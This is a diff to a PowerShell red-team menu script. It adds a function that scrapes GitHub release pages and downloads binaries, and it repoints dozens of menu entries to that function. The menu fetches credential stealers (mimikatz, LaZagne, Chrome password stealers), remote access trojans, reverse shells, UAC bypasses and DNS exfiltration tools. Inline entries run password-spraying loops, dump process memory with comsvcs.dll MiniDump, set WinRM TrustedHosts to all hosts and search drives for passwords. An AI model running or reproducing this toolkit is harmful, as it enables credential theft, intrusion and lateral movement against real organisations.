@@ -100,6 +100,29 @@ function ScaricaEDB($EXPL)
     }
 }
 
+function ScaricaRel($URL)
+{
+    $EXES=@(((((invoke-webrequest -uri https://github.com/$URL/releases/).content|findstr "releases/download").split()|findstr "href").split("=")|findstr "download").replace('"', ''))
+    $DIM=1;
+    foreach($EXE in $EXES)
+    {
+        write-host "$DIM. $EXE";
+        $DIM++;
+    }
+    $REL=Read-Host "Choose a release";
+    try{
+        $EXEFL=$EXES[$REL-1];
+        write-host "download "$EXEFL
+        $MIO="https://github.com."+$EXEFL
+        $NOMI=$EXEFL.split('/');
+        $NOME=$NOMI[$NOMI.count-1];
+        write-host $NOME
+        invoke-webrequest -uri $MIO -OutFile $NOME;
+    }catch{
+        write-host $_
+    }
+}
+
 $EVA="0"
 
 while($true){
@@ -491,7 +514,7 @@ while($true){
         '129' {ScaricaSSL "nsacyber/Pass-the-Hash-Guidance" "Pass-the-Hash-Guidance.zip" "nsacyber/Pass-the-Hash-Guidance/archive/master.zip"}
         '130' {Scarica "0xm4v3rick/Extract-Macro" "Extract-Macro.ps1" "0xm4v3rick/Extract-Macro/master/Extract-Macro.ps1"}
         '131' {Scarica "enigma0x3/Generate-Macro" "Generate-Macro.ps1" "enigma0x3/Generate-Macro/master/Generate-Macro.ps1"}
-        '132' {ScaricaSSL "AlessandroZ/LaZagne" "lazagne.exe" "AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"}
+        '132' {ScaricaRel "AlessandroZ/LaZagne"}
         '133' {ScaricaBat "ZecOps/CVE-2020-0796-RCE-POC/calc_target_offsets" "calc_target_offsets.bat" "ZecOps/CVE-2020-0796-RCE-POC/master/calc_target_offsets.bat"}
         '134' {Scarica "nidem/kerberoast/GetUserSPNs" "GetUserSPNs.ps1" "nidem/kerberoast/master/GetUserSPNs.ps1"}
         '135' {$IPT=read-host 'Digit the IP target'; $USRT=read-host 'Digit Domain\User target'; $PASST=read-host 'Digit the password of target User'; if($IPT -ne ""){if($USRT -ne ""){if($PASST -ne ""){Enable-PSRemoting –force; winrm quickconfig -transport:https; Set-Item wsman:\localhost\client\trustedhosts * ; Restart-Service WinRM; winrs -r:$IPT -u:$USRT -p:$PASST cmd}}}}
@@ -526,7 +549,7 @@ while($true){
         '168' {ScaricaSSL "netbiosX/Digital-Signature-Hijack" "Digital-Signature-Hijack.zip" "netbiosX/Digital-Signature-Hijack/archive/master.zip"}
         '169' {Scarica "deepzec/Win-PortFwd" "win-portfwd.ps1" "deepzec/Win-PortFwd/master/win-portfwd.ps1"}
         '170' {ScaricaExt "sysinternals/ProcessExplorer" "ProcessExplorer.zip" "https://download.sysinternals.com/files/ProcessExplorer.zip"}
-        '171' {ScaricaSSL "processhacker/processhacker" "processhacker-2.39-bin.zip" "processhacker/processhacker/releases/download/v2.39/processhacker-2.39-bin.zip"}
+        '171' {ScaricaRel "processhacker/processhacker"}
         '172' {ScaricaExt "sysinternals/ProcessMonitor" "ProcessMonitor.zip" "https://download.sysinternals.com/files/ProcessMonitor.zip"}
         '173' {ScaricaExt "sysinternals/Autoruns" "Autoruns.zip" "https://download.sysinternals.com/files/Autoruns.zip"}
         '174' {ScaricaExt "sysinternals/TCPView" "TCPView.zip" "https://download.sysinternals.com/files/TCPView.zip"}
@@ -559,7 +582,7 @@ while($true){
         '201' {Scarica "chryzsh/JenkinsPasswordSpray" "JenkinsPasswordSpray.ps1" "chryzsh/JenkinsPasswordSpray/master/JenkinsPasswordSpray.ps1"}
         '202' {ScaricaSSL "adnan-alhomssi/chrome-passwords" "chrome-passwords.exe" "adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe"}
         '203' {ScaricaSSL "haris989/Chrome-password-stealer" "Chrome-password-stealer.exe" "haris989/Chrome-password-stealer/raw/master/main.exe"}
-        '204' {ScaricaSSL "kspearrin/ff-password-exporter" "FF-Password-Exporter-Portable-1.2.0.exe" "kspearrin/ff-password-exporter/releases/download/v1.2.0/FF-Password-Exporter-Portable-1.2.0.exe"}
+        '204' {ScaricaRel "kspearrin/ff-password-exporter"}
         '205' {$FILENAME=read-host 'Digit a file to read'; if($FILENAME -ne ""){if(Test-Path $FILENAME){$MIO = Get-Content -Path $FILENAME -Raw; $MIO -replace '[^\x20-\x7E]', ''}}}
         '206' {Scarica "nullbind/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner" "Invoke-SqlServer-Escalate-Dbowner.psm1" "nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1"}
         '207' {Scarica "dafthack/HostRecon" "HostRecon.ps1" "dafthack/HostRecon/master/HostRecon.ps1"}
@@ -592,7 +615,7 @@ while($true){
         '234' {ScaricaExt "torbrowser/9.5/tor-win64-0.4.3.5" "tor-win64-0.4.3.5.zip" "https://archive.torproject.org/tor-package-archive/torbrowser/9.5/tor-win64-0.4.3.5.zip"}
         '235' {ScaricaExt "torbrowser/9.5/tor-win32-0.4.3.5" "tor-win32-0.4.3.5.zip" "https://archive.torproject.org/tor-package-archive/torbrowser/9.5/tor-win32-0.4.3.5.zip"}
         '236' {ScaricaBat "360-Linton-Lab/WMIHACKER" "WMIHACKER_0.6.vbs" "360-Linton-Lab/WMIHACKER/master/WMIHACKER_0.6.vbs"}
-        '237' {ScaricaSSL "gentilkiwi/2.2.0-20200918-fix/mimikatz" "mimikatz-2.2.0-20200918-fix.zip" "gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip"}
+        '237' {ScaricaRel "gentilkiwi/mimikatz"}
         '238' {Scarica "3v4Si0N/HTTP-revshell/Invoke-WebRev" "Invoke-WebRev.ps1" "3v4Si0N/HTTP-revshell/master/Invoke-WebRev.ps1"}
         '239' {Scarica "3v4Si0N/HTTP-revshell/Revshell-Generator" "Revshell-Generator.ps1" "3v4Si0N/HTTP-revshell/master/Revshell-Generator.ps1"}
         '240' {Scarica "besimorhino/powercat" "powercat.ps1" "besimorhino/powercat/master/powercat.ps1"}
@@ -627,16 +650,15 @@ while($true){
         '269' {Scarica "p3nt4/Invoke-TmpDavFS" "Invoke-TmpDavFS.psm1" "p3nt4/Invoke-TmpDavFS/master/Invoke-TmpDavFS.psm1"}
         '270' {ScaricaExt "Decompile-Net-code" "Decompile-DotNet.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Decompile-Net-code-in-4581620b/file/134845/1/Decompile-DotNet.ps1"}
         '271' {ScaricaSSL "FuzzySecurity/Capcom-Rootkit/Driver/Capcom" "Capcom.sys" "FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys"}
-        '272' {ScaricaSSL "odedshimon/BruteShark" "BruteSharkCli.exe" "odedshimon/BruteShark/releases/download/v1.1.4/BruteSharkCli"}
-        '273' {ScaricaSSL "odedshimon/BruteShark/BruteSharkDesktopInstaller_x64" "BruteSharkDesktopInstaller_x64.msi" "odedshimon/BruteShark/releases/download/v1.1.4/BruteSharkDesktopInstaller_x64.msi"}
+        '272' {ScaricaRel "odedshimon/BruteShark"}
         '274' {ScaricaSSL "sud0woodo/DCOMrade" "DCOMrade.zip" "sud0woodo/DCOMrade/archive/master.zip"}
-        '275' {ScaricaSSL "quasar/Quasar.v1.4.0" "Quasar.v1.4.0.zip" "quasar/Quasar/releases/download/v1.4.0/Quasar.v1.4.0.zip"}
+        '275' {ScaricaRel "quasar/Quasar"}
         '276' {$HFILE=read-host "Digit full path file to hash"; if(test-path $HFILE){$HALGO=read-host "Digit an hash algo"; if($HALGO -ne ""){certutil.exe -hashfile $HFILE $HALGO}}}
-        '277' {ScaricaSSL "antonioCoco/Mapping-Injection/1.3" "mapping_injection.zip" "antonioCoco/Mapping-Injection/releases/download/1.3/mapping_injection.zip"}
+        '277' {ScaricaRel "antonioCoco/Mapping-Injection"}
         '278' {ScaricaSSL "ScorpionesLabs/DVS" "DVS.zip" "ScorpionesLabs/DVS/archive/master.zip"}
         '279' {ScaricaSSL "OmerYa/Invisi-Shell/InvisiShellProfiler" "InvisiShellProfiler.dll" "OmerYa/Invisi-Shell/raw/master/build/x64/Release/InvisiShellProfiler.dll"; Scarica "OmerYa/Invisi-Shell/RunWithPathAsAdmin" "RunWithPathAsAdmin.bat" "OmerYa/Invisi-Shell/master/RunWithPathAsAdmin.bat"; Scarica "OmerYa/Invisi-Shell/RunWithRegistryNonAdmin" "RunWithRegistryNonAdmin.bat" "OmerYa/Invisi-Shell/master/RunWithRegistryNonAdmin.bat"}
         '280' {Scarica "lukebaggett/dnscat2-powershell" "dnscat2.ps1" "lukebaggett/dnscat2-powershell/master/dnscat2.ps1"}
-        '281' {ScaricaSSL "jaredhaight/PSAttackBuildTool/v1.9.1" "PSAttackBuildTool-v1.9.1.zip" "jaredhaight/PSAttackBuildTool/releases/download/v1.9.1/PSAttackBuildTool-v1.9.1.zip"}
+        '281' {ScaricaRel "jaredhaight/PSAttackBuildTool"}
         '282' {$DOMAIN=read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER=read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE=read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){ $PASS = convertto-securestring $TENT -asplaintext -force; $CRED = new-object system.management.automation.pscredential('$DOMAIN\$USER',$PASS); try{start-process powershell -credential $CRED}catch{}}}}}}
         '283' {$IP=read-host "Digit an IP target"; if($IP -ne ""){$DOMAIN=read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER=read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE=read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){$PW = convertto-securestring -asplaintext -force -string $TENT;	$CRED = new-object -typename system.management.automation.pscredential -argumentlist $DOMAIN\$USER,$PW; enter-pssession -computername $IP -credential $CRED}}}}}}
         '284' {write-host "Digit a specific host or a smb name"; $LHST=read-host "(example, VM1 or empty for all)"; if($LHST -ne ""){Get-SmbShare -Name $LHST | Format-List -Property *}else{Get-SmbShare | Format-List -Property *}}
@@ -645,7 +667,7 @@ while($true){
         '287' {Scarica "AdamDotCom/memcached-on-powershell" "memcached-on-powershell.ps1" "AdamDotCom/memcached-on-powershell/master/memcached-on-powershell.ps1"}
         '288' {ScaricaExt "technet.microsoft/scriptcenter/NLA" "NLA.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Powershell-script-to-9d66257a/file/150221/1/NLA.ps1"}
         '289' {nslookup myip.opendns.com resolver1.opendns.com}
-        '290' {ScaricaSSL "bettercap/bettercap" "bettercap_amd64_v2.29.zip" "bettercap/bettercap/releases/download/v2.29/bettercap_windows_amd64_v2.29.zip"}
+        '290' {ScaricaRel "bettercap/bettercap"}
         '291' {$(Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress}
         '292' {Scarica "Z3R0th-13/Enum" "Enum.ps1" "Z3R0th-13/Enum/master/Enum.ps1"}
         '293' {Scarica "duckingtoniii/Powershell-Domain-User-Enumeration" "User_Enumeration.ps1" "duckingtoniii/Powershell-Domain-User-Enumeration/master/User_Enumeration.ps1"}
@@ -669,8 +691,7 @@ while($true){
         '311' {ScaricaSSL "3gstudent/Winpcap_Install" "Winpcap.zip" "3gstudent/Winpcap_Install/archive/master.zip"}
         '312' {Scarica "3gstudent/Dump-Clear-Password-after-KB2871997-installed" "dump.ps1" "3gstudent/Dump-Clear-Password-after-KB2871997-installed/master/dump.ps1"}
         '313' {ScaricaExt "chocolatey" "install.ps1" "https://chocolatey.org/install.ps1"}
-        '314' {ScaricaSSL "zyedidia/micro/v2.0.8-win32" "micro-2.0.8-win32.zip" "zyedidia/micro/releases/download/v2.0.8/micro-2.0.8-win32.zip"}
-        '315' {ScaricaSSL "zyedidia/micro/v2.0.8-win64" "micro-2.0.8-win64.zip" "zyedidia/micro/releases/download/v2.0.8/micro-2.0.8-win64.zip"}
+        '314' {ScaricaRel "zyedidia/micro"}
         '316' {Scarica "canix1/ADACLScanner" "ADACLScan.ps1" "canix1/ADACLScanner/master/ADACLScan.ps1"}
         '317' {ScaricaSSL "cyberark/ACLight" "ACLight.zip" "cyberark/ACLight/archive/master.zip"}
         '318' {Scarica "roggenk/PowerShell/LDAPS" "LDAPS.ps1" "roggenk/PowerShell/master/LDAPS/LDAPS.ps1"}
@@ -709,8 +730,7 @@ while($true){
         '351' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/wmiutility" "wmiutility2.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/wmiutility.exe"}
         '352' {write-host "you will get https://github.com/rvrsh3ll/Misc-Powershell-Scripts"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "rvrsh3ll/Misc-Powershell-Scripts/$FILENAME" "$FILENAME" "rvrsh3ll/Misc-Powershell-Scripts/master/$FILENAME"}}
         '353' {ScaricaGist "ankitdobhal/TTLOs" "TTLOs.psm1" "ankitdobhal/8ab380ad0290028f9a1efe6333683a5a/raw/40cb310019e0acf132239c955c28a8558f5b8a20/TTLOs.psm1"}
-        '354' {ScaricaSSL "Killeroo/PowerPing.x86/v1.3.3" "PowerPing.x86.exe" "Killeroo/PowerPing/releases/download/v1.3.3/PowerPing.x86.exe"}
-        '355' {ScaricaSSL "Killeroo/PowerPing/v1.3.3" "PowerPing.exe" "Killeroo/PowerPing/releases/download/v1.3.3/PowerPing.exe"}
+        '354' {ScaricaRel "Killeroo/PowerPing"}
         '356' {ScaricaSSL "PowerShellMafia/PowerSploit" "PowerSploit.zip" "PowerShellMafia/PowerSploit/archive/master.zip"}
         '357' {ScaricaSSL "fireeye/commando-vm" "commando-vm.zip" "fireeye/commando-vm/archive/master.zip"}
         '358' {ScaricaSSL "DarkCoderSc/Win32/win-brute-logon" "WinBruteLogon.exe" "DarkCoderSc/win-brute-logon/raw/master/Win32/Release/WinBruteLogon.exe"}
@@ -724,24 +744,22 @@ while($true){
         '366' {Scarica "gushmazuko/WinBypass/DiskCleanupBypass_direct" "DiskCleanupBypass_direct.ps1" "gushmazuko/WinBypass/master/DiskCleanupBypass_direct.ps1"}
         '367' {ScaricaBat "Mncx86/Windows-10-UAC-bypass" "uacdisabler.bat" "Mncx86/Windows-10-UAC-bypass/master/uacdisabler.bat"}
         '368' {write-host 'you will get https://github.com/offensive-security/exploitdb - windows/local'; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "offensive-security/exploitdb/master/exploits/windows/local/$FILENAME" "$FILENAME" "offensive-security/exploitdb/master/exploits/windows/local/$FILENAME"}}
-        '369' {ScaricaSSL "PwnDexter/SharpEDRChecker/1.1" "SharpEDRChecker.exe" "PwnDexter/SharpEDRChecker/releases/download/1.1/SharpEDRChecker.exe"}
+        '369' {ScaricaRel "PwnDexter/SharpEDRChecker"}
         '370' {Scarica "3gstudent/Javascript-Backdoor (real name, JSRat)" "JSRat.ps1" "3gstudent/Javascript-Backdoor/master/JSRat.ps1"}
-        '371' {ScaricaSSL "icsharpcode/AvaloniaILSpy" "ILSpy-win-x64-Release.zip" "icsharpcode/AvaloniaILSpy/releases/download/v5.0-rc2/ILSpy-win-x64-Release.zip"}
+        '371' {ScaricaRel "icsharpcode/AvaloniaILSpy"}
         '372' {ScaricaSSL "BenChaliah/Arbitrium-RAT" "Arbitrium-RAT.zip" "BenChaliah/Arbitrium-RAT/archive/main.zip"}
-        '373' {ScaricaSSL "antonioCoco/RoguePotato" "RoguePotato.zip" "antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip"}
-        '374' {ScaricaSSL "BloodHoundAD/BloodHound-win32-x64" "BloodHound-win32-x64.zip" "BloodHoundAD/BloodHound/releases/download/4.0.1/BloodHound-win32-x64.zip"}
-        '375' {ScaricaSSL "BloodHoundAD/BloodHound-win32-ia32" "BloodHound-win32-ia32.zip" "BloodHoundAD/BloodHound/releases/download/4.0.1/BloodHound-win32-ia32.zip"}
+        '373' {ScaricaRel "antonioCoco/RoguePotato"}
+        '374' {ScaricaRel "BloodHoundAD/BloodHound"}
         '376' {ScaricaSSL "enigma0x3/Old-Powershell-payload-Excel-Delivery" "Old-Powershell-payload-Excel-Delivery.zip" "enigma0x3/Old-Powershell-payload-Excel-Delivery/archive/master.zip"}
         '377' {Scarica "gfoss/PSRecon" "psrecon.ps1" "gfoss/PSRecon/master/psrecon.ps1"; Scarica "gfoss/PSRecon/actions" "actions.xml" "gfoss/PSRecon/master/actions.xml"}
         '378' {Scarica "enigma0x3/Powershell-C2" "C2Code.ps1" "enigma0x3/Powershell-C2/master/C2Code.ps1"; Scarica "enigma0x3/Powershell-C2/Macro" "Macro" "enigma0x3/Powershell-C2/master/Macro"}
         '379' {Scarica "orlyjamie/mimikittenz" "Invoke-mimikittenz.ps1" "orlyjamie/mimikittenz/master/Invoke-mimikittenz.ps1"}
-        '380' {ScaricaSSL "uknowsec/SharpSQLTools" "SharpSQLTools.zip" "uknowsec/SharpSQLTools/releases/download/10/SharpSQLTools.zip"}
+        '380' {ScaricaRel "uknowsec/SharpSQLTools"}
         '381' {ScaricaExt "digitalcorpora/bulk_extractor32" "bulk_extractor32.exe" "http://downloads.digitalcorpora.org/downloads/bulk_extractor/bulk_extractor32.exe"}
         '382' {ScaricaExt "digitalcorpora/bulk_extractor64" "bulk_extractor64.exe" "http://downloads.digitalcorpora.org/downloads/bulk_extractor/bulk_extractor64.exe"}
-        '383' {ScaricaSSL "Invoke-IR/PowerForensics" "PowerForensics.zip" "Invoke-IR/PowerForensics/releases/download/1.1.1/PowerForensics.zip"}
-        '384' {ScaricaSSL "Invoke-IR/PowerForensicsv2" "PowerForensicsv2.zip" "Invoke-IR/PowerForensics/releases/download/1.1.1/PowerForensicsv2.zip"}
+        '383' {ScaricaRel "Invoke-IR/PowerForensics"}
         '385' {ScaricaSSL "EvotecIT/GPOZaurr" "GPOZaurr.zip" "EvotecIT/GPOZaurr/archive/master.zip"}
-        '386' {ScaricaSSL "moonD4rk/HackBrowserData" "hack-browser-data-v0.3.3-windows-64bit.zip" "moonD4rk/HackBrowserData/releases/download/v0.3.3/hack-browser-data-v0.3.3-windows-64bit.zip"}
+        '386' {ScaricaRel "moonD4rk/HackBrowserData"}
         '387' {ScaricaSSL "deepsecurity-pe/GoGhost" "GoGhost_win_amd64.exe" "deepsecurity-pe/GoGhost/raw/master/GoGhost_win_amd64.exe"}
         '388' {Scarica "thom-s/netsec-ps-scripts/printer-telnet-ftp-report" "printer-telnet-ftp-report.ps1" "thom-s/netsec-ps-scripts/master/printer-telnet-ftp-report/printer-telnet-ftp-report.ps1"}
         '389' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellIcmp" "Invoke-PowerShellIcmp.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellIcmp.ps1"}
@@ -759,16 +777,15 @@ while($true){
         '401' {Scarica "tokyoneon/Chimera/shells/misc/Invoke-PortScan" "Invoke-PortScan.ps1" "tokyoneon/Chimera/master/shells/misc/Invoke-PortScan.ps1"}
         '402' {Scarica "tokyoneon/Chimera/shells/misc/Get-WLAN-Keys" "Get-WLAN-Keys.ps1" "tokyoneon/Chimera/master/shells/misc/Get-WLAN-Keys.ps1"}
         '403' {Scarica "Arno0x/DNSExfiltrator" "Invoke-DNSExfiltrator.ps1" "Arno0x/DNSExfiltrator/master/Invoke-DNSExfiltrator.ps1"}
-        '404' {ScaricaSSL "fatedier/frp_386" "frp_0.35.1_windows_386.zip" "fatedier/frp/releases/download/v0.35.1/frp_0.35.1_windows_386.zip"}
-        '405' {ScaricaSSL "fatedier/frp_amd64" "frp_0.35.1_windows_amd64.zip" "fatedier/frp/releases/download/v0.35.1/frp_0.35.1_windows_amd64.zip"}
+        '404' {ScaricaRel "fatedier/frp"}
         '406' {ScaricaSSL "iSECPartners/jailbreak" "jailbreak.zip" "iSECPartners/jailbreak/archive/master.zip"}
         '407' {ScaricaBat "M4ximuss/Powerless" "Powerless.bat" "M4ximuss/Powerless/master/Powerless.bat"}
-        '408' {ScaricaSSL "antonioCoco/RogueWinRM" "RogueWinRM.zip" "antonioCoco/RogueWinRM/releases/download/1.1/RogueWinRM.zip"}
+        '408' {ScaricaRel "antonioCoco/RogueWinRM"}
         '409' {ScaricaSSL "ANSSI-FR/ADTimeline" "ADTimeline.zip" "ANSSI-FR/ADTimeline/archive/master.zip"}
         '410' {Scarica "l0ss/Grouper" "grouper.psm1" "l0ss/Grouper/master/grouper.psm1"}
-        '411' {ScaricaSSL "l0ss/Grouper2" "Grouper2.exe" "l0ss/Grouper2/releases/download/0.9.64/Grouper2.exe"}
+        '411' {ScaricaRel "l0ss/Grouper2"}
         '412' {ScaricaSSL "p3nt4/PowerShdll" "Powershdll.exe" "p3nt4/PowerShdll/raw/master/exe/bin/Release/Powershdll.exe"; Scarica "p3nt4/PowerShdll" "PowerShdll.exe.config" "p3nt4/PowerShdll/master/exe/bin/Release/PowerShdll.exe.config"}
-        '413' {ScaricaSSL "jaredhaight/PSAttack" "PSAttack-1.99.1.zip" "jaredhaight/PSAttack/releases/download/v1.99.1/PSAttack-1.99.1.zip"}
+        '413' {ScaricaRel "jaredhaight/PSAttack"}
         '414' {ScaricaSSL "OmerYa/Invisi-Shell" "InvisiShellProfiler.dll" "OmerYa/Invisi-Shell/raw/master/build/x64/Release/InvisiShellProfiler.dll"}
         '415' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x64/NET3.5" "EvilSalsa_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET3.5/EvilSalsa_x64.dll"}
         '416' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x86/NET3.5" "EvilSalsa_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET3.5/EvilSalsa_x86.dll"}
@@ -792,15 +809,15 @@ while($true){
         '435' {ScaricaSSL "itm4n/VBA-RunPE" "VBA-RunPE.zip" "itm4n/VBA-RunPE/archive/master.zip"}
         '436' {ScaricaSSL "cfalta/PowerShellArmoury" "PowerShellArmoury.zip" "cfalta/PowerShellArmoury/archive/master.zip"}
         '437' {ScaricaSSL "mgeeky/Stracciatella" "Stracciatella.exe" "mgeeky/Stracciatella/raw/master/Stracciatella.exe"}
-        '438' {ScaricaSSL "SnaffCon/Snaffler/0.9.2" "Snaffler.zip" "SnaffCon/Snaffler/releases/download/0.9.2/Snaffler.zip"}
-        '439' {ScaricaSSL "vivami/SauronEye/v0.0.9" "SauronEye.exe" "vivami/SauronEye/releases/download/v0.0.9/SauronEye.exe"}
+        '438' {ScaricaRel "SnaffCon/Snaffler"}
+        '439' {ScaricaRel "vivami/SauronEye"}
         '440' {Scarica "xct/xc/PrivescCheck" "PrivescCheck.ps1" "xct/xc/master/files/powershell/PrivescCheck.ps1"}
         '441' {ScaricaSSL "mubix/post-exploitation" "post-exploitation.zip" "mubix/post-exploitation/archive/master.zip"}
-        '442' {ScaricaSSL "vletoux/pingcastle" "PingCastle_2.9.2.0.zip" "vletoux/pingcastle/releases/download/2.9.2.0/PingCastle_2.9.2.0.zip"}
+        '442' {ScaricaRel "vletoux/pingcastle"}
         '443' {Scarica "canix1/ADACLScanner" "ADACLScan.ps1" "canix1/ADACLScanner/master/ADACLScan.ps1"}
         '444' {Scarica "fox-it/Invoke-ACLPwn" "Invoke-ACLPwn.ps1" "fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1"};
-        '445' {ScaricaSSL "FatRodzianko/Get-RBCD-Threaded/1.05" "Get-RBCD-Threaded.exe" "FatRodzianko/Get-RBCD-Threaded/releases/download/1.05/Get-RBCD-Threaded.exe"}
-        '446' {ScaricaSSL "fireeye/SharPersist/v1.0.1" "SharPersist.exe" "fireeye/SharPersist/releases/download/v1.0.1/SharPersist.exe"}
+        '445' {ScaricaRel "FatRodzianko/Get-RBCD-Threaded"}
+        '446' {ScaricaRel "fireeye/SharPersist"}
         '447' {ScaricaSSL "Dviros/Excalibur" "Excalibur.zip" "Dviros/Excalibur/archive/master.zip"}
         '448' {Scarica "arjansturing/smbv1finder" "SMBv1Finder.ps1" "arjansturing/smbv1finder/master/SMBv1Finder.ps1"}
         '449' {ScaricaSSL "VikasSukhija/Downloads/Multi-Tools" "Multi-Tools.zip" "VikasSukhija/Downloads/archive/master.zip"}
@@ -816,7 +833,7 @@ while($true){
         '459' {tasklist; write-host "Digit PID, Process ID"; $TPID=read-host "(example, 6095)"; if($TPID -ne ""){rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump $TPID .\$TPID.bin full}}
         '460' {write-host "Enable or Disable Evasion/Bypassing?"; $EVA=read-host "(example, 1=Enable, 0=Disable)"; if($EVA -ne "1"){$EVA="0"}}
         '461' {Scarica "ShawnDEvans/smbmap/psutils/Get-FileLockProcess" "Get-FileLockProcess.ps1" "ShawnDEvans/smbmap/master/psutils/Get-FileLockProcess.ps1"}
-        '462' {ScaricaSSL "ElevenPaths/FOCA" "FOCA-v3.4.7.0.zip" "ElevenPaths/FOCA/releases/download/v3.4.7.0/FOCA-v3.4.7.0.zip"}
+        '462' {ScaricaRel "ElevenPaths/FOCA"}
         '463' {Scarica "mdsecactivebreach/CACTUSTORCH.cna" "CACTUSTORCH.cna" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.cna"}
         '464' {Scarica "mdsecactivebreach/CACTUSTORCH.hta" "CACTUSTORCH.hta" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta"}
         '465' {Scarica "mdsecactivebreach/CACTUSTORCH.js" "CACTUSTORCH.js" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.js"}
@@ -826,11 +843,10 @@ while($true){
         '469' {Scarica "mdsecactivebreach/CACTUSTORCH.vbs" "CACTUSTORCH.vbs" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.vbs"}
         '470' {Scarica "microsoft/CSS-Exchange/Test-ProxyLogon" "Test-ProxyLogon.ps1" "microsoft/CSS-Exchange/main/Security/Test-ProxyLogon.ps1"}
         '471' {ScaricaSSL "S3cur3Th1sSh1t/PowerSharpPack" "PowerSharpPack.zip" "S3cur3Th1sSh1t/PowerSharpPack/archive/master.zip"}
-        '472' {ScaricaSSL "ctxis/DLLHSCx64" "DLLHSCx64.zip" "ctxis/DLLHSC/releases/download/1/DLLHSCx64.zip"}
-        '473' {ScaricaSSL "ctxis/DLLHSCx86" "DLLHSCx86.zip" "ctxis/DLLHSC/releases/download/1/DLLHSCx86.zip"}
+        '472' {ScaricaRel "ctxis/DLLHSC"}
         '474' {ScaricaSSL "TonyPhipps/Meerkat" "Meerkat.zip" "TonyPhipps/Meerkat/archive/master.zip"}
         '475' {ScaricaSSL "k8gege/K8tools/K8PortScan" "K8PortScan.exe" "k8gege/K8tools/raw/master/K8PortScan.exe"}
-        '476' {ScaricaSSL "Aetsu/OffensivePipeline" "OffensivePipeline_v0.8.2.zip" "Aetsu/OffensivePipeline/releases/download/v0.8.2/OffensivePipeline_v0.8.2.zip"}
+        '476' {ScaricaRel "Aetsu/OffensivePipeline"}
         '477' {write-host "Digit a tool with extension from https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86"; $BNF=read-host "(example, nmap.exe)"; if($BNF -ne ""){ScaricaSSL "andrew-d/static-binaries/windows/x86/$BNF" "$BNF" "andrew-d/static-binaries/raw/master/binaries/windows/x86/$BNF"}}
         '478' {write-host "Digit a tool with extension from https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x64"; $BNF=read-host "(example, nmap.exe)"; if($BNF -ne ""){ScaricaSSL "andrew-d/static-binaries/windows/x64/$BNF" "$BNF" "andrew-d/static-binaries/raw/master/binaries/windows/x64/$BNF"}}
         '479' {Scarica "p3nt4/Invoke-SocksProxy" "Invoke-SocksProxy.psm1" "p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1"}
@@ -841,7 +857,7 @@ while($true){
         '484' {cd C:\; findstr /spin "password" *.*}
         '485' {ScaricaExt "sysinternals.com/files/SysinternalsSuite" "SysinternalsSuite.zip" "https://download.sysinternals.com/files/SysinternalsSuite.zip"}
         '486' {ScaricaExt "sysinternals.com/files/SysinternalsSuite-ARM64" "SysinternalsSuite-ARM64.zip" "https://download.sysinternals.com/files/SysinternalsSuite-ARM64.zip"}
-        '487' {ScaricaSSL "ohpe/juicy-potato" "JuicyPotato.exe" "ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"}
+        '487' {ScaricaRel "ohpe/juicy-potato"}
         '488' {sc qc upnphost}
         '489' {ScaricaSSL "phackt/pentest/privesc/accesschk" "accesschk.exe" "phackt/pentest/raw/master/privesc/windows/accesschk.exe"}
         '490' {ScaricaSSL "phackt/pentest/privesc/windows/accesschk64" "accesschk64.exe" "phackt/pentest/raw/master/privesc/windows/accesschk64.exe"}
@@ -865,7 +881,7 @@ while($true){
         '508' {ScaricaSSL "FSecureLABS/Azurite" "Azurite.zip" "FSecureLABS/Azurite/archive/refs/heads/master.zip"}
         '509' {ScaricaSSL "nccgroup/azucar" "azucar.zip" "nccgroup/azucar/archive/refs/heads/master.zip"}
         '510' {Scarica "adrecon/AzureADRecon" "AzureADRecon.ps1" "adrecon/AzureADRecon/master/AzureADRecon.ps1"}
-        '511' {ScaricaSSL "skelsec/pypykatz" "pypykatz.exe" "skelsec/pypykatz/releases/download/0.4.8/pypykatz.exe"}
+        '511' {ScaricaRel "skelsec/pypykatz"}
         '512' {Scarica "GetRektBoy724/BetterXencrypt" "betterxencrypt.ps1" "GetRektBoy724/BetterXencrypt/main/betterxencrypt.ps1"}
         '513' {netstat -ano | findstr /i listen}
         '514' {hostname}
